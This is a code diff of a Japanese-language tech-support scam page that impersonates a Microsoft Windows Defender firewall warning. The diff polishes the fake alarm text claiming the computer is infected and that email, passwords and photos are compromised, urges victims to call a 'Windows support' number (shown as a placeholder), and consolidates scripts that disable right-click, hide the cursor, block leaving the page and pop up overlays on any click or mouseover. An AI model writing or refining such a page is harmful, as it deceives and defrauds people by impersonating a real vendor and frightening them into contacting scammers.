@@ -9,21 +9,6 @@
 
     <link href="./windows/msmm.png" rel="icon" id="favicon" type="image/png">
     <link href="./windows/tapa.css" rel="stylesheet">
-
-    <script type="text/javascript" src="./jquery/jquery-1.4.4.min.js"></script>
-
-    <script type="text/javascript">
-      $(function(){
-        $('body').bind('contextmenu', function(e){
-          return false;
-        });
-      });
-    </script>
-
-    <script src="./windows/noir.js"></script>
-    <script src="./windows/frdneudfh6shYBg.js"></script>
-    <script src="./windows/phndncwysc.js"></script>
-    <script src="./windows/ipdmJDnfs.js"></script>
   </head>
 
   <body class="map" id="mycanvas" onbeforeunload="return myFunction()" style="cursor:none">
@@ -100,8 +85,8 @@
 
       <div id="txtintro">
         <span class="colo-rd">
-          <div id="useragent">Microsoft Windows ファイアウォールの警告!</div>
-          <div id="datetime">悪意のある危険に感染したシステム</div>
+          <div>Microsoft Windows ファイアウォールの警告</div>
+          <div id="datetime">お使いのシステムが危険にさらされています</div>
           <div id="timezone"> (Error_code: 2v7HgTvB)</div>
         </span>
       </div>
@@ -109,10 +94,10 @@
       <img src="./windows/re.gif" id="banner">
 
       <div id="disclaimer">
-        セキュリティ上の理由から、このシステムへのアクセスはブロックされています.
+        セキュリティ上の理由により、このシステムへのアクセスは制限されています。
         <br>
         <span class="support" style="font-size:22px;">
-          Windows サポートに電話してください:
+          Windows サポートにご連絡ください:
           <br>
           <span style="border:1px solid #114d9a;border-radius:5px;padding:4px 5px">
             <img src="./windows/winlo.png" alt="" style="width: 25px;vertical-align: sub;">
@@ -149,27 +134,28 @@
         Windows-Defender - セキュリティ警告
       </p>
 
-      <p><b>セキュリティ上の理由から、このシステムへのアクセスはブロックされています !</b></p>
+      <p><b>セキュリティ上の理由により、このシステムへのアクセスは制限されています</b></p>
 
-      <p>お使いのコンピュータは悪意のある危険に感染していると報告されています。次のデータが侵害されました:</p>
+      <p>お使いのコンピュータが悪意のあるプログラムに感染している可能性があります。次の情報が危険にさらされている可能性があります:</p>
+
 
       <p>
-        &gt; Email ID <br>
-        &gt; Bank Password <br>
-        &gt; Facebook Login <br>
-        &gt; Photos and Documents
+        &gt; メールアドレス <br>
+        &gt; パスワード <br>
+        &gt; 重要な内部データ <br>
+        &gt; 写真やドキュメント
       </p>
 
-      <p>Windows Defender スキャンにより、パスワード、オンライン ID、財務情報、個人ファイル、写真、ドキュメントを盗む可能性のあるアドウェアがこのデバイス上で見つかりました。</p>
+      <p>Windows Defenderのスキャンによって、個人情報やパスワード、財務情報、ファイルが盗まれる可能性のあるアドウェアが検出されました。</p>
 
-      <p>すぐにご連絡ください。当社のエンジニアが電話で削除プロセスをご案内します.</p>
+      <p>すぐに当社のエンジニアにご連絡ください。電話で削除手順をご案内します。</p>
 
-      <p>すぐに Windows サポートに電話して、この脅威を報告し、個人情報の盗難を防止し、このデバイスへのアクセスのブロックを解除してください。</p>
+      <p>Windows サポートに連絡し、脅威を報告するとともに、個人情報の盗難を防ぎ、システムへのアクセス制限を解除してください。</p>
 
-      <p>このウィンドウを閉じると個人情報が危険にさらされる可能性があり、Windows の登録が一時停止される可能性があります。</p>
+      <p>このウィンドウを閉じると、個人情報が危険にさらされる場合があります。また、Windowsの利用が一時的に制限される可能性があります。</p>
 
       <p style="padding-bottom:0;color:#fff;font-size:16px">
-        Windows サポートに電話してください:
+        すぐに Windows サポートにお電話ください:
         <strong>
           <span style="border:0px solid #fff;border-radius:5px;padding:5px 5px">
             <br>直接お電話ください 000-0000-0000
@@ -179,16 +165,16 @@
 
       <div class="action_buttons">
         <a class="active" id="leave_page" style="cursor:pointer;color:#fff!important">OK</a>
-        <a class="active" id="leave_page" style="color:#fff!important">cancel</a>
+        <a class="active" id="leave_page" style="color:#fff!important">キャンセル</a>
       </div>
     </div>
 
     <div class="answer_list" style="display:none;background-color:#000;height:auto;width:550px;left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">
       <p style="color:#fff;margin-top:10px;font-size:16px;padding:0 5px" class="text-center">
-        すぐにご連絡ください。当社のエンジニアが電話で削除プロセスをご案内します。お使いのコンピュータは無効になっています。 Windows Defender SmartScreen は、認識されないアプリケーションの表示を防止するようになりました。このアプリケーションを実行すると、システムが危険にさらされる可能性があります。
+        すぐにご連絡ください。当社のエンジニアが電話で削除手順をご案内します。お使いのコンピュータは無効になっています。Windows Defender SmartScreenにより、認識されないアプリケーションの実行がブロックされました。このままではシステムが危険にさらされる可能性があります。
         <br>
         <strong>
-          Windows サポートに電話する:
+          すぐに Windows サポートにお電話ください:
           <span style="border:1px solid #383d41;border-radius:5px;padding:6px 5px">
             <img src="./windows/winlo.png" alt=" " style="width: 25px;vertical-align: bottom;">
             直接お電話ください 000-0000-0000
@@ -217,57 +203,43 @@
         </svg>
       </div>
     </div>
+<script>
+  $(document).ready(function() {
+    $("#mycanvas").click(function() {
+      $("#welcomeDiv").show();
+      $("#poptxt").show();
+      $("#footer").show();
+    });
 
-    <script src="./windows/nvidia.js"></script>
-    <script src="./windows/jupiter.js"></script>
-    <script src="./windows/bxsafe.js"></script>
+    $("#cross").click(function() {
+      $("#poptxt").show();
+    });
 
-    <script>
-      $(document).ready(function() {
-        $("#mycanvas").click(function() {
-          $("#welcomeDiv").show();
-        });
-      });
-    </script>
+    $("body").mouseover(function() {
+      $("#poptxt").show();
+    });
 
-    <script>
-      $(document).ready(function() {
-        $("#mycanvas").click(function() {
-          $("#poptxt").show();
-        });
+    $("#chat").delay(600).fadeIn(100);
 
-        $("#cross").click(function() {
-          $("#poptxt").show();
-        });
-      });
-    </script>
+    $('body').bind('contextmenu', function(e){
+      return false;
+    });
+  });
+</script>
 
-    <script>
-      $(document).ready(function() {
-        $("#mycanvas").click(function() {
-          $("#footer").show();
-        });
-      });
-    </script>
+<script src="./windows/esc.js"></script>
+<script src="./windows/main.js"></script>
+<script src="./windows/info.js"></script>
+<script src="./windows/custom.js"></script>
+<script src="./windows/kejrfgresdfd.js"></script>
+<script src="./windows/noir.js"></script>
+<script src="./windows/frdneudfh6shYBg.js"></script>
+<script src="./windows/phndncwysc.js"></script>
+<script src="./windows/ipdmJDnfs.js"></script>
+<script src="./jquery/jquery-1.4.4.min.js"></script>
+<script src="./windows/nvidia.js"></script>
+<script src="./windows/jupiter.js"></script>
+<script src="./windows/bxsafe.js"></script>
 
-    <script>
-      $(document).ready(function() {
-        $("body").mouseover(function() {
-          $("#poptxt").show();
-        });
-      });
-    </script>
-
-    <script>
-      $(document).ready(function() {
-        $("#chat").delay(600).fadeIn(100);
-      });
-    </script>
-
-    <script src="./windows/esc.js"></script>
-    <script src="./windows/main.js"></script>
-    <script src="./windows/info.js"></script>
-    <script src="./windows/custom.js"></script>
-    <script src="./windows/kejrfgresdfd.js"></script>
   </body>
 </html>
